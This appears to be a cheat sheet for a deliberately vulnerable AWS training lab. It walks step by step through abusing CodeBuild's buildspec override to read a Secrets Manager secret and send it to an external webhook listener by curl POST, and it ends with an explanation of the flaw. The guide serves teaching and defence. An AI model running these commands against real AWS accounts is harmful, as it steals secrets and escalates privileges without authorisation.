# Cheat Sheet - codebuild_buildspec_override

## Setup

```bash
# Configure the starting profile using the credentials from start.txt
aws configure --profile bob
# Enter the access key ID, secret access key, and your preferred region (e.g. us-east-1)
```

---

## Step 1 — Enumerate CodeBuild Projects

```bash
aws codebuild list-projects --profile bob
```

Note the project name — it will look like `cg-vulnerable-project-<cgid>`.

---

## Step 2 — Inspect the Project

```bash
aws codebuild batch-get-projects \
  --names cg-vulnerable-project-<cgid> \
  --profile bob
```

Check `environment.environmentVariables`; there should be a variable with the fields `name`, `value`, and `type`, where `type` is `SECRETS_MANAGER`.
Note down the `value` field, it is the name of the target secret, and you will need it in Step 4.

---

## Step 3 — Set Up a Listener

On your attacker machine, start a simple HTTP listener to receive the exfiltrated secret:

```bash
# Use a public endpoint service such as https://webhook.site
# Copy the unique URL it gives you
```

Make note of your listener URL, the webhook.site URL.

---

## Step 4 — Inject Inline Buildspec and Start the Build

Replace `<cgid>`, `<paste the value copied in Step 2>`, and `<listener-url>` with your values. Either option below achieves the same result.

### Option A — Buildspec File

Write the buildspec override to a local file:

```bash
cat > /tmp/buildspec_override.yml << 'EOF'

version: 0.2
phases:
  build:
    commands:
      - |
        VALUE=$(aws secretsmanager get-secret-value --secret-id <paste the value copied in Step 2> --query "SecretString" --output text)
        curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"
EOF
```

Then start the build, pointing `--buildspec-override` at the file:

```bash
aws codebuild start-build \
  --project-name cg-vulnerable-project-<cgid> \
  --buildspec-override file:///tmp/buildspec_override.yml \
  --profile bob \
  --region us-east-1
```

### Option B — Direct Command

A single command with no intermediate file, using an ANSI-C quoted string so the newlines are passed as `\n` instead of typed literally:

```bash
aws codebuild start-build \
  --project-name cg-vulnerable-project-test01 \
  --buildspec-override $'version: 0.2\nphases:\n  build:\n    commands:\n      - |\n        VALUE=$(aws secretsmanager get-secret-value --secret-id <paste the value copied in Step 2> --query "SecretString" --output text)\n      - |\n         curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"'\
  --profile bob \
  --region us-east-1
```


Note the `id` returned in the response, you can use it to track the build.

---

## Step 5 — Monitor the Build (Optional)

```bash
aws codebuild batch-get-builds \
  --ids <build-id> \
  --profile bob
```

Wait until `buildStatus` changes from `IN_PROGRESS` to `SUCCEEDED`.

---

## Step 6 — Collect the Secret

Check your listener. The secret value (the flag) will arrive as a POST body within a few seconds of the build reaching the `build` phase.

Example output at listener:
```
{"flag":"Congratulations, you successfully injected the commands and escalated the privileges"}
```

**Scenario complete.**

---

## Key Vulnerability

`codebuild:BatchGetProjects` returns a project's environment variable configuration, including the `SECRETS_MANAGER`-type reference used here, which discloses the exact name of the target secret without exposing its value. `codebuild:StartBuild` separately accepts a `buildspecOverride` parameter that completely replaces the project's configured buildspec at runtime, while still injecting the project's own environment variables into the build. Combined with a service role that holds `secretsmanager:GetSecretValue` scoped to that one secret, an identity holding nothing more than `ListProjects`, `BatchGetProjects`, and `StartBuild` can exfiltrate it without ever holding Secrets Manager permissions itself. Scoping the role down to a single secret ARN does not prevent this: the vulnerability is the buildspec override giving arbitrary command execution as that role, not the breadth of what the role can reach.